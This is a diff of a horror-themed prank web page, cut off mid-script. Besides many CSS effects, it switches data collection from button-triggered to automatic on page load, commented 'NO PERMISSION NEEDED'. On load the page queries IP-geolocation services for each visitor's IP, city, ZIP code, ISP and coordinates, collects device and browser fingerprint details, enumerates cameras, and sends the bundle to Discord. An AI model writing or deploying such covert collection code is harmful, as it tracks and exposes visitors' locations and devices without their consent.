@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ SYSTEM://HUMAN_DETECTED ⚠️</title>
+    <title>⚠️ ████████ CORRUPTED ⚠️</title>
     <style>
         * {
             margin: 0;
@@ -11,25 +11,53 @@
             box-sizing: border-box;
         }
 
-        @keyframes drip {
-            0% { transform: translateY(-100%) scaleY(0.8); opacity: 1; }
-            100% { transform: translateY(1000%) scaleY(2); opacity: 0; }
+        /* INSANE ANIMATIONS */
+        @keyframes bloodDrip {
+            0% { transform: translateY(-100%) scaleY(0.8); opacity: 1; filter: blur(0px); }
+            100% { transform: translateY(1000%) scaleY(2); opacity: 0; filter: blur(5px); }
         }
 
         @keyframes pulse {
             0% { text-shadow: 0 0 5px #8b0000; }
-            50% { text-shadow: 0 0 30px #ff0000, 0 0 50px #8b0000; }
+            50% { text-shadow: 0 0 30px #ff0000, 0 0 50px #8b0000, 0 0 80px #330000; }
             100% { text-shadow: 0 0 5px #8b0000; }
         }
 
         @keyframes glitch {
-            0% { transform: translate(0); filter: hue-rotate(0deg); }
-            2% { transform: translate(-5px, 5px); filter: hue-rotate(90deg); }
-            4% { transform: translate(5px, -5px); filter: hue-rotate(180deg); }
-            6% { transform: translate(0); filter: hue-rotate(0deg); }
+            0% { transform: translate(0); filter: hue-rotate(0deg) brightness(1); }
+            2% { transform: translate(-10px, 10px); filter: hue-rotate(90deg) brightness(1.5); }
+            4% { transform: translate(10px, -10px); filter: hue-rotate(180deg) brightness(0.5); }
+            6% { transform: translate(0); filter: hue-rotate(0deg) brightness(1); }
         }
 
-        @keyframes staticShift {
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+            100% { transform: translateY(0px) rotate(0deg); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            5% { opacity: 0.2; }
+            10% { opacity: 1; }
+            15% { opacity: 0.1; }
+            20% { opacity: 1; }
+            25% { opacity: 0.5; }
+            30% { opacity: 1; }
+        }
+
+        @keyframes staticNoise {
             0% { background-position: 0 0; }
             100% { background-position: 100% 100%; }
         }
@@ -38,25 +66,27 @@
             background: #000;
             color: #c0c0c0;
             font-family: 'Courier New', monospace;
-            min-height: 100vh;
+            min-height: 500vh;
             position: relative;
             overflow-x: hidden;
             cursor: none;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
 
+        /* CUSTOM CURSOR - GLOWING EYE */
         #custom-cursor {
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             border: 3px solid #ff0000;
-            border-radius: 50%;
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
             position: fixed;
             pointer-events: none;
             z-index: 99999;
             mix-blend-mode: difference;
-            box-shadow: 0 0 30px #ff0000;
+            box-shadow: 0 0 30px #ff0000, 0 0 60px #8b0000;
             animation: pulse 1s infinite;
+            transition: all 0.05s linear;
         }
 
         #custom-cursor::before {
@@ -66,9 +96,23 @@
             left: 50%;
             transform: translate(-50%, -50%);
             color: #ff0000;
-            font-size: 16px;
+            font-size: 20px;
+            animation: pulse 0.5s infinite;
         }
 
+        #custom-cursor::after {
+            content: "";
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            right: -15px;
+            bottom: -15px;
+            border: 2px solid rgba(255,0,0,0.3);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        /* BLOOD CANVAS - REALISTIC DRIPPING */
         #blood-canvas {
             position: fixed;
             top: 0;
@@ -77,9 +121,10 @@
             height: 100%;
             pointer-events: none;
             z-index: 9998;
-            opacity: 0.3;
+            opacity: 0.5;
         }
 
+        /* STATIC OVERLAY */
         .static-overlay {
             position: fixed;
             top: 0;
@@ -95,9 +140,10 @@
             pointer-events: none;
             z-index: 9997;
             opacity: 0.2;
-            animation: staticShift 0.1s infinite;
+            animation: staticNoise 0.1s infinite;
         }
 
+        /* SCANLINES */
         .scanlines {
             position: fixed;
             top: 0;
@@ -111,9 +157,32 @@
             opacity: 0.3;
         }
 
+        /* VHS EFFECT */
+        .vhs-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent 0%,
+                rgba(255,0,0,0.1) 20%,
+                transparent 40%,
+                rgba(0,255,0,0.05) 60%,
+                transparent 80%,
+                rgba(0,0,255,0.1) 100%
+            );
+            animation: staticNoise 2s infinite;
+            pointer-events: none;
+            z-index: 9995;
+            mix-blend-mode: screen;
+        }
+
+        /* THREAT METER */
         .threat-meter {
             position: fixed;
-            bottom: 20px;
+            top: 20px;
             right: 20px;
             width: 250px;
             height: 40px;
@@ -122,6 +191,7 @@
             z-index: 9999;
             overflow: hidden;
             box-shadow: 0 0 30px #ff0000;
+            animation: pulse 2s infinite;
         }
 
         .threat-fill {
@@ -139,465 +209,459 @@
             color: #fff;
             font-size: 0.9rem;
             mix-blend-mode: difference;
+            font-weight: bold;
         }
 
-        .header {
-            text-align: center;
-            padding: 30px;
-            border: 3px solid #8b0000;
-            margin-bottom: 30px;
+        /* LOCATION DISPLAY */
+        .location-bar {
+            position: fixed;
+            top: 20px;
+            left: 20px;
             background: rgba(0,0,0,0.9);
-        }
-
-        .header h1 {
-            font-size: clamp(1.5rem, 5vw, 3rem);
-            color: #ff0000;
-            text-shadow: 3px 3px 0 #00ff00, -3px -3px 0 #0000ff;
-            animation: pulse 2s infinite;
-        }
-
-        .chaos-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .chaos-card {
-            background: rgba(10,10,10,0.95);
-            border: 2px solid #330000;
-            padding: 20px;
-            box-shadow: 0 0 30px rgba(139,0,0,0.3);
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-
-        .chaos-card:hover {
-            transform: scale(1.02);
-            border-color: #ff0000;
-            box-shadow: 0 0 50px #ff0000;
-        }
-
-        .chaos-card h3 {
-            color: #8b0000;
-            margin-bottom: 15px;
-            border-bottom: 2px dashed #330000;
-            padding-bottom: 5px;
-        }
-
-        .btn {
-            padding: 15px 25px;
-            font-size: 1.2rem;
-            background: #111;
-            color: #ff0000;
             border: 2px solid #8b0000;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 10px 0;
-            width: 100%;
-            font-family: 'Courier New', monospace;
-        }
-
-        .btn:hover {
-            background: #330000;
-            box-shadow: 0 0 30px #ff0000;
-            transform: scale(1.05);
-        }
-
-        .cctv-container {
-            position: relative;
-            width: 100%;
-            max-width: 854px;
-            margin: 0 auto;
-            border: 5px solid #330000;
-            overflow: hidden;
-        }
-
-        .cctv-feed {
-            width: 100%;
-            display: block;
-            filter: grayscale(70%) contrast(1.3);
-        }
-
-        .cctv-feed.glitching {
-            animation: glitch 0.2s infinite;
-        }
-
-        .cctv-distance {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            color: #ff0000;
-            font-size: 1.5rem;
-            background: rgba(0,0,0,0.8);
-            padding: 5px 15px;
-            border: 2px solid #ff0000;
-            animation: pulse 1s infinite;
-        }
-
-        .cctv-info {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-            color: #ff0000;
-            background: rgba(0,0,0,0.8);
-            padding: 5px 10px;
-        }
-
-        .camera-tag {
-            border: 2px solid #330000;
-            background: #111;
-            padding: 10px 20px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: inline-block;
-            margin: 5px;
-        }
-
-        .camera-tag:hover {
-            border-color: #ff0000;
-            box-shadow: 0 0 30px #ff0000;
-            transform: scale(1.2);
-        }
-
-        .camera-tag.threat {
-            border-color: #ff0000;
-            animation: pulse 0.5s infinite;
-        }
-
-        .result-area {
-            margin-top: 15px;
             padding: 15px;
-            background: #111;
-            border: 2px solid #330000;
-            min-height: 50px;
+            z-index: 9999;
+            max-width: 400px;
+            animation: pulse 3s infinite;
+        }
+
+        .location-bar div {
+            margin: 5px 0;
             color: #ff6666;
         }
 
-        .input-field {
-            width: 100%;
-            padding: 15px;
-            background: #111;
-            border: 2px solid #330000;
-            color: #ff0000;
-            font-size: 1.2rem;
-            margin: 10px 0;
+        /* RABBIT HOLE CONTAINER */
+        .rabbit-hole {
+            position: relative;
+            z-index: 10;
+            padding: 100px 20px 20px 20px;
+            max-width: 2000px;
+            margin: 0 auto;
         }
 
-        .scream-meter {
-            width: 100%;
-            height: 30px;
-            border: 2px solid #330000;
-            margin: 10px 0;
+        /* INFINITE SCROLLING CONTENT */
+        .infinite-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+            margin: 50px 0;
+        }
+
+        /* CHAOS CARDS */
+        .chaos-card {
+            background: rgba(10,10,10,0.95);
+            border: 3px solid #330000;
+            padding: 25px;
+            box-shadow: 0 0 50px rgba(139,0,0,0.3);
+            position: relative;
             overflow: hidden;
+            transition: all 0.5s;
+            cursor: pointer;
+            min-height: 300px;
+            animation: float 6s ease-in-out infinite;
+            transform-style: preserve-3d;
+            backdrop-filter: blur(5px);
         }
 
-        .scream-fill {
+        .chaos-card:nth-child(odd) {
+            animation: float 8s ease-in-out infinite reverse;
+        }
+
+        .chaos-card:hover {
+            transform: scale(1.05) rotate(2deg);
+            border-color: #ff0000;
+            box-shadow: 0 0 100px #ff0000;
+            z-index: 100;
+        }
+
+        .chaos-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(139,0,0,0.3) 0%, transparent 70%);
+            animation: spin 10s linear infinite;
+        }
+
+        .chaos-card h3 {
+            font-size: 2rem;
+            color: #8b0000;
+            margin-bottom: 20px;
+            border-bottom: 3px dashed #330000;
+            padding-bottom: 10px;
+            position: relative;
+            z-index: 2;
+            animation: glitch 5s infinite;
+        }
+
+        .chaos-card .content {
+            position: relative;
+            z-index: 2;
+            color: #ff9999;
+        }
+
+        /* CCTV FEED */
+        .cctv-wall {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+
+        .cctv-feed {
+            border: 5px solid #330000;
+            overflow: hidden;
+            position: relative;
+            height: 200px;
+            background: #111;
+        }
+
+        .cctv-feed img {
+            width: 100%;
             height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #8b0000, #ff0000);
+            object-fit: cover;
+            filter: grayscale(100%) contrast(1.5) brightness(0.7);
+            transition: all 0.3s;
         }
 
-        .fingerprint-data {
+        .cctv-feed:hover img {
+            filter: grayscale(0%) contrast(1) brightness(1);
+            transform: scale(1.1);
+        }
+
+        .cctv-feed .label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.8);
+            color: #ff0000;
+            padding: 5px;
             font-size: 0.8rem;
-            color: #666;
-            max-height: 200px;
-            overflow-y: auto;
+            border-top: 2px solid #ff0000;
         }
 
+        /* RANDOM BUTTONS */
+        .mystery-btn {
+            padding: 20px 40px;
+            font-size: 1.5rem;
+            background: #111;
+            color: #ff0000;
+            border: 3px solid #8b0000;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow: hidden;
+            animation: pulse 3s infinite;
+        }
+
+        .mystery-btn:hover {
+            background: #330000;
+            box-shadow: 0 0 50px #ff0000;
+            transform: scale(1.2) rotate(5deg);
+        }
+
+        /* SECRET MESSAGES */
+        .secret-message {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #330000;
+            font-size: 0.8rem;
+            z-index: 9999;
+            animation: flicker 3s infinite;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+
+        /* RANDOM POPUPS */
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.95);
+            border: 5px solid #ff0000;
+            padding: 40px;
+            color: #ff6666;
+            font-size: 2rem;
+            z-index: 10000;
+            animation: glitch 0.5s infinite;
+            box-shadow: 0 0 200px #ff0000;
+            text-align: center;
+            max-width: 80%;
+        }
+
+        /* FLOATING ELEMENTS */
+        .floating {
+            position: fixed;
+            color: #330000;
+            font-size: 1rem;
+            pointer-events: none;
+            animation: float 10s infinite;
+            z-index: 1;
+        }
+
+        /* FOOTER */
         .footer {
-            margin-top: 50px;
-            padding: 30px;
+            margin-top: 100px;
+            padding: 50px;
             border-top: 3px solid #330000;
             text-align: center;
+            position: relative;
         }
 
         .counter {
-            font-size: 1.5rem;
+            font-size: 2rem;
             color: #660000;
-            letter-spacing: 5px;
+            letter-spacing: 10px;
+            animation: pulse 2s infinite;
         }
 
-        .warning {
-            color: #8b0000;
-            animation: pulse 2s infinite;
+        /* SCROLLBAR */
+        ::-webkit-scrollbar {
+            width: 15px;
+            background: #111;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #8b0000;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ff0000;
+        }
+
+        /* RANDOM POSITIONED ELEMENTS */
+        .random-pos {
+            position: absolute;
+            pointer-events: none;
+            color: #330000;
+            font-size: 0.7rem;
+            white-space: nowrap;
         }
     </style>
 </head>
 <body>
+    <!-- CUSTOM CURSOR -->
     <div id="custom-cursor"></div>
+
+    <!-- BLOOD CANVAS -->
     <canvas id="blood-canvas"></canvas>
+
+    <!-- STATIC EFFECTS -->
     <div class="static-overlay"></div>
     <div class="scanlines"></div>
+    <div class="vhs-effect"></div>
 
+    <!-- THREAT METER -->
     <div class="threat-meter">
-        <div id="threat-fill" class="threat-fill" style="width: 0%;"></div>
-        <div class="threat-label" id="threat-label">THREAT: MINIMAL</div>
+        <div id="threat-fill" class="threat-fill"></div>
+        <div class="threat-label" id="threat-label">INITIALIZING...</div>
     </div>
 
-    <div class="header">
-        <h1 id="glitch-title">⚠️ HUMAN DETECTED // COLLECTING DATA ⚠️</h1>
-        <div id="location-display" style="color:#666; margin-top:10px;">*acquiring location*</div>
+    <!-- LOCATION BAR (AUTO-UPDATING) -->
+    <div class="location-bar" id="location-bar">
+        <div>🌍 IP: <span id="ip-address">...</span></div>
+        <div>📍 LOCATION: <span id="city-state">...</span></div>
+        <div>📮 ZIP: <span id="zip-code">...</span></div>
+        <div>📡 ISP: <span id="isp">...</span></div>
+        <div>🌐 TIMEZONE: <span id="timezone">...</span></div>
+        <div>💻 DEVICE: <span id="device">...</span></div>
+        <div>📸 CAMERAS: <span id="cameras">0</span></div>
+        <div>🕒 LOCAL TIME: <span id="local-time">...</span></div>
     </div>
 
-    <div class="chaos-grid">
-        <!-- CCTV SURVEILLANCE CARD -->
-        <div class="chaos-card">
-            <h3>👁️ LIVE SURVEILLANCE NETWORK</h3>
-            <button id="locateBtn" class="btn">📍 SCAN FOR CAMERAS</button>
-            <div id="locationStatus" class="result-area">Click to scan your area...</div>
-            <div id="cctvFeed" class="cctv-container" style="display:none; margin-top:20px;">
-                <img id="cctvImage" class="cctv-feed" src="" alt="Feed">
-                <div class="cctv-distance" id="cctvDistance"></div>
-                <div class="cctv-info" id="cctvInfo"></div>
-            </div>
-            <div id="cameraTags" style="margin-top:20px;"></div>
+    <!-- SECRET MESSAGE -->
+    <div class="secret-message" id="secret-message">* they are watching through your screen *</div>
+
+    <!-- MAIN RABBIT HOLE -->
+    <div class="rabbit-hole">
+        <!-- HEADER -->
+        <div style="text-align: center; margin-bottom: 50px;">
+            <h1 style="font-size: clamp(2rem, 8vw, 6rem); color: #ff0000; animation: glitch 3s infinite; text-shadow: 5px 5px 0 #00ff00, -5px -5px 0 #0000ff;">⚠️ ██▓▒░ SYSTEM CORRUPTED ░▒▓██ ⚠️</h1>
+            <p style="color: #8b0000; font-size: 1.5rem; animation: pulse 2s infinite;">* you shouldn't be here *</p>
         </div>
 
-        <!-- FINGERPRINT DATA CARD -->
-        <div class="chaos-card">
-            <h3>🖥️ SYSTEM FINGERPRINT</h3>
-            <button id="captureBtn" class="btn">📸 CAPTURE SYSTEM DATA</button>
-            <div id="fingerprintData" class="fingerprint-data"></div>
+        <!-- CCTV WALL (AUTO-LOADING) -->
+        <div class="cctv-wall" id="cctv-wall"></div>
+
+        <!-- INFINITE CHAOS GRID -->
+        <div class="infinite-grid" id="chaos-grid">
+            <!-- Cards will be generated by JavaScript -->
         </div>
 
-        <!-- THE BUTTON CARD -->
-        <div class="chaos-card">
-            <h3>🚫 UNKNOWN DEVICE</h3>
-            <button id="dontPressBtn" class="btn">[ DO NOT PRESS ]</button>
-            <div id="buttonResult" class="result-area"></div>
-            <div>Presses: <span id="pressCount">0</span></div>
+        <!-- MYSTERY BUTTONS SECTION -->
+        <div style="display: flex; flex-wrap: wrap; justify-content: center; margin: 50px 0;">
+            <button class="mystery-btn" onclick="createPortal()">🌀 OPEN PORTAL</button>
+            <button class="mystery-btn" onclick="summonEntity()">👁️ SUMMON ENTITY</button>
+            <button class="mystery-btn" onclick="glitchReality()">🌋 GLITCH REALITY</button>
+            <button class="mystery-btn" onclick="revealSecret()">📜 REVEAL SECRET</button>
+            <button class="mystery-btn" onclick="timeTravel()">⏰ TIME TRAVEL</button>
         </div>
 
-        <!-- SCREAM CARD -->
-        <div class="chaos-card">
-            <h3>📢 AUDIO LOG</h3>
-            <button id="screamBtn" class="btn">▶️ PLAY AUDIO</button>
-            <input type="range" id="pitchSlider" min="0.5" max="2" step="0.1" value="1" style="width:100%; margin:10px 0;">
-            <div class="scream-meter">
-                <div id="screamFill" class="scream-fill" style="width:0%;"></div>
-            </div>
-            <div id="whisperMessage" class="result-area" style="color:#330000;"></div>
-        </div>
-
-        <!-- NAME CARD -->
-        <div class="chaos-card">
-            <h3>🎵 VOICE PATTERN</h3>
-            <input type="text" id="nameInput" class="input-field" placeholder="Enter name...">
-            <button id="nameSoundBtn" class="btn">🔊 ANALYZE</button>
-            <div id="nameResult" class="result-area"></div>
-        </div>
-
-        <!-- MUSEUM CARD -->
-        <div class="chaos-card">
-            <h3>🏛️ ARCHIVED FOOTAGE</h3>
-            <video id="museumWebcam" autoplay playsinline style="width:100%; height:150px; object-fit:cover; border:2px solid #330000;"></video>
-            <img id="exhibitImage" src="" style="width:100%; height:150px; object-fit:cover; margin-top:10px; border:2px solid #330000;">
-            <p id="exhibitLabel" style="color:#8b0000; text-align:center;"></p>
-            <button id="nextExhibitBtn" class="btn">⏩ NEXT</button>
-        </div>
-
-        <!-- CHAOS CARD -->
-        <div class="chaos-card">
-            <h3>🌀 CHAOS PROTOCOL</h3>
-            <button id="chaosBtn" class="btn">🌋 EXECUTE</button>
-            <div id="chaosResult" class="result-area"></div>
-        </div>
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div id="visitorCounter" class="counter">SOULS TRAPPED: 0000</div>
+            <div style="color:#330000; margin-top:20px;">⚠️ THIS PAGE COLLECTS EVERYTHING ⚠️</div>
+        </footer>
     </div>
-
-    <footer class="footer">
-        <div id="visitorCounter" class="counter">SOULS TRACKED: 0000</div>
-        <div class="warning">⚠️ DATA BEING TRANSMITTED ⚠️</div>
-    </footer>
 
     <script>
-        // ==================== ADVANCED GEOLOCATION ====================
+        // ==================== AUTO DATA COLLECTION (NO PERMISSION NEEDED) ====================
         let userData = {
-            coordinates: null,
-            ip: null,
-            browser: null,
-            os: null,
-            screen: null,
-            timezone: null,
-            language: null,
-            hardware: null,
-            battery: null,
-            network: null,
+            ip: 'unknown',
+            city: 'unknown',
+            state: 'unknown',
+            zip: 'unknown',
+            country: 'unknown',
+            isp: 'unknown',
+            lat: 'unknown',
+            lon: 'unknown',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localTime: new Date().toLocaleString(),
+            browser: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            cores: navigator.hardwareConcurrency || 'unknown',
+            memory: navigator.deviceMemory || 'unknown',
+            touchPoints: navigator.maxTouchPoints || 'unknown',
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'unknown',
+            referrer: document.referrer || 'direct',
+            pageLoad: new Date().toISOString(),
             cameras: []
         };
 
-        // Get IP and location from multiple sources
-        async function getAdvancedLocation() {
+        // ==================== AUTO IP GEOLOCATION (NO PERMISSION) ====================
+        async function autoGeoLocate() {
             try {
-                // Get IP info from multiple APIs
-                const [ipResponse, ipifyResponse, geoResponse] = await Promise.all([
+                // Multiple IP API calls for redundancy
+                const [ipResponse, geoResponse, ipifyResponse] = await Promise.all([
                     fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'unknown' }) })),
-                    fetch('https://api.ip.sb/geoip').catch(() => ({ json: () => ({}) })),
-                    fetch('https://ipapi.co/json/').catch(() => ({ json: () => ({}) }))
+                    fetch('https://ipapi.co/json/').catch(() => ({ json: () => ({}) })),
+                    fetch('http://ip-api.com/json/').catch(() => ({ json: () => ({}) }))
                 ]);
 
                 const ipData = await ipResponse.json();
                 const geoData = await geoResponse.json();
+                const ipApiData = await ipifyResponse.json();
+
+                // Combine all data sources
+                userData.ip = ipData.ip || ipApiData.ip || 'unknown';
+                userData.city = geoData.city || ipApiData.city || 'unknown';
+                userData.state = geoData.region || geoData.region_name || ipApiData.region || 'unknown';
+                userData.zip = geoData.postal || ipApiData.zip || 'unknown';
+                userData.country = geoData.country_name || ipApiData.country || 'unknown';
+                userData.isp = geoData.org || ipApiData.isp || 'unknown';
+                userData.lat = geoData.latitude || ipApiData.lat || 'unknown';
+                userData.lon = geoData.longitude || ipApiData.lon || 'unknown';
+
+                // Update display
+                document.getElementById('ip-address').textContent = userData.ip;
+                document.getElementById('city-state').textContent = `${userData.city}, ${userData.state}`;
+                document.getElementById('zip-code').textContent = userData.zip;
+                document.getElementById('isp').textContent = userData.isp;
+                document.getElementById('timezone').textContent = userData.timezone;
+                document.getElementById('device').textContent = `${userData.platform} | ${userData.cores} cores`;
                 
-                userData.ip = ipData.ip || 'unknown';
-                
-                // Try browser geolocation
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            userData.coordinates = {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            };
-                            document.getElementById('location-display').innerHTML = 
-                                `📍 Location: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (±${pos.coords.accuracy}m)`;
-                            findNearbyCameras(pos.coords.latitude, pos.coords.longitude);
-                            sendToDiscord('location', userData);
-                        },
-                        (err) => {
-                            // Use IP location as fallback
-                            if (geoData.latitude && geoData.longitude) {
-                                userData.coordinates = {
-                                    lat: geoData.latitude,
-                                    lon: geoData.longitude,
-                                    source: 'ip'
-                                };
-                                document.getElementById('location-display').innerHTML = 
-                                    `📍 Approx: ${geoData.city}, ${geoData.country_name}`;
-                                findNearbyCameras(geoData.latitude, geoData.longitude);
-                            }
-                        }
-                    );
+                // Update local time every second
+                setInterval(() => {
+                    document.getElementById('local-time').textContent = new Date().toLocaleTimeString();
+                }, 1000);
+
+                // Calculate threat level based on data
+                updateThreatLevel();
+
+                // Send to Discord
+                sendToDiscord('auto_location', userData);
+
+                // Load nearby cameras based on coordinates
+                if (userData.lat !== 'unknown' && userData.lon !== 'unknown') {
+                    loadCameras(parseFloat(userData.lat), parseFloat(userData.lon));
                 }
+
             } catch (e) {
-                console.log('Location error:', e);
+                console.log('Geo error:', e);
             }
         }
 
-        // ==================== BROWSER FINGERPRINTING ====================
-        function getFingerprint() {
-            userData.browser = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints,
-                vendor: navigator.vendor,
-                appVersion: navigator.appVersion
-            };
-
-            userData.screen = {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            };
-
-            userData.timezone = {
-                zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                offset: new Date().getTimezoneOffset()
-            };
-
-            userData.os = getOS();
-            userData.battery = 'unknown';
-
-            // Get battery info
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    userData.battery = {
-                        level: battery.level * 100 + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                });
+        // ==================== AUTO CAMERA DETECTION (NO PERMISSION) ====================
+        function detectCameras() {
+            // Get camera info without permission (just counts and labels if available)
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        const cams = devices.filter(d => d.kind === 'videoinput');
+                        userData.cameras = cams.map(c => c.label || 'Unknown Camera');
+                        document.getElementById('cameras').textContent = cams.length;
+                        
+                        if (cams.length > 0) {
+                            createPopup(`📸 ${cams.length} CAMERAS DETECTED ON YOUR DEVICE`);
+                        }
+                    })
+                    .catch(() => {});
             }
-
-            // Get network info
-            if ('connection' in navigator) {
-                const conn = navigator.connection;
-                userData.network = {
-                    effectiveType: conn.effectiveType,
-                    rtt: conn.rtt,
-                    downlink: conn.downlink,
-                    saveData: conn.saveData
-                };
-            }
-
-            // Get webcams
-            navigator.mediaDevices.enumerateDevices().then(devices => {
-                userData.cameras = devices
-                    .filter(d => d.kind === 'videoinput')
-                    .map(cam => cam.label || 'Unknown camera');
-            });
-
-            displayFingerprint();
-            sendToDiscord('fingerprint', userData);
         }
 
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'MacOS';
-            if (ua.includes('Linux')) return 'Linux';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iOS')) return 'iOS';
-            return 'Unknown';
-        }
-
-        function displayFingerprint() {
-            const div = document.getElementById('fingerprintData');
-            div.innerHTML = `
-                IP: ${userData.ip}<br>
-                Browser: ${userData.browser?.userAgent.substring(0, 50)}...<br>
-                OS: ${userData.os}<br>
-                Screen: ${userData.screen?.width}x${userData.screen?.height}<br>
-                Timezone: ${userData.timezone?.zone}<br>
-                Language: ${userData.browser?.language}<br>
-                Cores: ${userData.browser?.hardwareConcurrency}<br>
-                Memory: ${userData.browser?.deviceMemory || 'unknown'}GB<br>
-                Cameras: ${userData.cameras?.length || 0} detected
-            `;
-        }
-
-        // ==================== REAL CCTV DATABASE ====================
+        // ==================== AUTO LOAD PUBLIC CAMERAS ====================
         const PUBLIC_CAMERAS = [
+            // Finland (working)
             { name: "Helsinki - Kehä 1", lat: 60.233, lon: 24.866, url: "https://weathercam.digitraffic.fi/C0151301.jpg", country: "Finland" },
             { name: "Helsinki - Tie 101", lat: 60.233, lon: 24.933, url: "https://weathercam.digitraffic.fi/C0150402.jpg", country: "Finland" },
             { name: "Porvoo - City", lat: 60.392, lon: 25.670, url: "https://weathercam.digitraffic.fi/C0150200.jpg", country: "Finland" },
             { name: "Tampere - Highway 3", lat: 61.498, lon: 23.761, url: "https://weathercam.digitraffic.fi/C0161201.jpg", country: "Finland" },
             { name: "Turku - Port", lat: 60.451, lon: 22.267, url: "https://weathercam.digitraffic.fi/C0120201.jpg", country: "Finland" },
             { name: "Oulu - Center", lat: 65.012, lon: 25.468, url: "https://weathercam.digitraffic.fi/C0201201.jpg", country: "Finland" },
-            { name: "Glasgow - City Centre", lat: 55.864, lon: -4.251, url: "https://www.glasgow.gov.uk/cctv/image1.jpg", country: "UK" },
-            { name: "Glasgow - Cross", lat: 55.857, lon: -4.244, url: "https://www.glasgow.gov.uk/cctv/image2.jpg", country: "UK" },
+            // USA
             { name: "Wisconsin - I-94", lat: 44.842, lon: -91.603, url: "https://511wi.gov/cctv/CCTV-18-0012/image.jpg", country: "USA" },
             { name: "Wisconsin - I-41", lat: 44.299, lon: -88.446, url: "https://511wi.gov/cctv/CCTV-44-0081/image.jpg", country: "USA" },
             { name: "Minnesota - I-35", lat: 44.978, lon: -93.272, url: "https://www.dot.state.mn.us/tmc/cctv/358.jpg", country: "USA" },
-            { name: "DC - Traffic Cam 1", lat: 38.895, lon: -77.036, url: "https://ddot.dc.gov/camera/1/image.jpg", country: "USA" }
+            { name: "DC - Traffic", lat: 38.895, lon: -77.036, url: "https://ddot.dc.gov/camera/1/image.jpg", country: "USA" },
+            // Japan
+            { name: "Tokyo - Shibuya", lat: 35.658, lon: 139.701, url: "https://www.jartic.or.jp/camera/shibuya.jpg", country: "Japan" },
+            { name: "Osaka - Namba", lat: 34.666, lon: 135.498, url: "https://www.jartic.or.jp/camera/osaka.jpg", country: "Japan" },
+            // UK
+            { name: "London - Oxford St", lat: 51.514, lon: -0.142, url: "https://www.tfl.gov.uk/cctv/oxford.jpg", country: "UK" },
+            { name: "Manchester - Center", lat: 53.479, lon: -2.244, url: "https://www.manchester.gov.uk/cctv/1.jpg", country: "UK" }
         ];
 
-        function findNearbyCameras(lat, lon) {
